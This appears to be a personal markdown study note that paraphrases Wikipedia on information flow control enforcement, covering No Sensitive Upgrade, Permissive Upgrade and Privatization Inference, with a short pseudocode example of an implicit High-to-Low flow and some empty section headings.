The naïve approach consists on enforcing the confidentiality property on all variables whose value is affected by other variables. This method leads to partially leaked information due to on some instances of the application a variable is Low and in others High.

Other approaches
- see below "IFC enforcement machanisms"
##### No Sensitive Upgrade (NSU)
> 🔗 https://en.wikipedia.org/wiki/Information_flow_(information_theory)#Declassification_approaches_for_implicit_flows

"No sensitive upgrade" halts the program whenever a High variable affects the value of a Low variable. Since it simply looks for expressions where an [information leakage](https://en.wikipedia.org/wiki/Information_leakage "Information leakage") might happen, without looking at the context, it may halt a program that, despite having potential information leakage, never actually leaks information.

In the following example x is High and y is Low.
```
var x, y
y := false
if x = true then
    y := true
return true
```

In this case the program would be halted since—syntactically speaking—it uses the value of a High variable to change a Low variable, despite the program never leaking information.
##### Permissive Upgrade (PU)
> 🔗 https://en.wikipedia.org/wiki/Information_flow_(information_theory)#Declassification_approaches_for_implicit_flows

Permissive-upgrade introduces an extra security class P which will identify information leaking variables. When a High variable affects the value of a Low variable, the latter is labeled P. If a P labeled variable affects a Low variable the program would be halted. To prevent the halting the Low and P variables should be converted to High using a privatization function to ensure no information leakage can occur. On subsequent instances the program will run without interruption.
##### Privatization Inference
> 🔗 https://en.wikipedia.org/wiki/Information_flow_(information_theory)#Declassification_approaches_for_implicit_flows

Privatization inference extends permissive upgrade to automatically apply the privatization function to any variable that might leak information. This method should be used during testing where it will convert most variables. Once the program moves into production the permissive-upgrade should be used to halt the program in case of an information leakage and the privatization functions can be updated to prevent subsequent leaks.


### Hybrid Enforcement



## Ref
